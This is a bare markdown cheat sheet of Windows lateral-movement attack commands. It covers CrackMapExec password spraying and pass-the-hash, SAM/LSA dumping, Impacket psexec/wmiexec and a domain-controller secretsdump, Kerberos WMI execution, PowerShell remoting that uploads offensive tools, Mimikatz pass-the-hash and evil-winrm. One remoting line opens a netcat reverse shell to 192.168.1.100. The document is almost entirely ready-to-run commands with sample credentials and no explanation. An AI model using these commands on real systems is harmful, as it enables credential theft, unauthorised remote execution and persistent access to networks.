### Crackmapexec
```
cme-hosts.txt -u username.txt -p password.txt --shares 
crackmapexec smb 192.168.1.1/24 -u Administrator -p '123456@!' -x "net users" 
crackmapexec smb 192.168.1.1/24 -u Administrator -H <NTLM Hash>  -x "hostname" 
crackmapexec smb 192.168.1.10 -u Administrator -H <NTLM Hash> --sam            
crackmapexec smb 192.168.1.10 -u Administrator -H  <NTLM Hash> --lsa            
psexec \\192.168.1.199 -u Administrator -p 123456Ww ipconfig

```
### Impacket Library
```
psexec.py Resilient-Ninja:123456@192.168.1.100 ipconfig 
wmiexec.py Resilient-Ninja:123456@192.168.1.100 ipconfig 
python wmiexec.py -hashes <NTLM Hash> Administrator@192.168.1.100 
python secretsdump.py -hashes <NTLM Hash> -just-dc insomina.io/Administrator@192.168.1.100

```

### Windows Management Instrumentation

```
Invoke-WMIExec -Target john.insomnia -Domain insomnia.io -Username John  -Hash <NTLM Hash> -Command "ipconfig" -verbose
Invoke-WMIExec -Target john.insomnia -Domain insomnia.io -Username John  -Hash <NTLM Hash> -Command "hostanme"

```
### Pass the Ticket Over WMI
```
wmic /authority:"Kerberos: Domain Hostname / Hostname process call create 
wmic /authority:"kerberos:insomnia.io\DC01" /node:DC01.insomnia.io path win32_process call create calc.exe
wmic /authority:"kerberos:insomnia.io\DC01" /node:DC01.insomnia.io "cmd /c ipconfig"
wmic /authority:"kerberos:insomnia.io\DC01" /node:DC01.insomnia.io "cmd /c ipconfig"

```
  ### PowerShell Remoting
 ```
$username = 'John\administrator'
$password = '123456@1'
$credential = New-Object System.Management.Automation.PSCredential -ArgumentList @($username,(ConvertTo-SecureString -String $password -AsPlainText -Force))

$Pivot = New-PSSession jOHN.insomnia.local -Credential $credential
Invoke-command -scriptblock{hostname} -Session $Pivot

#To Upload to targeted 
Copy-Item -Path C:\Users\NyaMeeEain\Desktop\Tools\PowerUpSQL.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 3)
Copy-Item -Path C:\Users\NyaMeeEain\Desktop\Tools\Invoke-SMBEnum.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 3)
Copy-Item -Path C:\Users\NyaMeeEain\Desktop\Tools\powerview-dev.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 3)
```

### Mimikatz Spawning 
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:John /domain:insomnia.io /ntlm:<> /run:powershell.exe"'
$Session = New-PSSession -ComputerName John.Insomnia
Enter-PSSession $Session
```

### PowerShell Remoting 
```
Invoke-Command -ComputerName john.insomnia.io -Credential $Cred  -ScriptBlock {hostname}
Invoke-Command -ComputerName john.insomnia.io -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.1.100 7777 -e cmd.exe}
```


### Evil-WinRM
 
```
proxychains evil-winrm -u john -H <NTLM Hash> -i 192.168.199
```



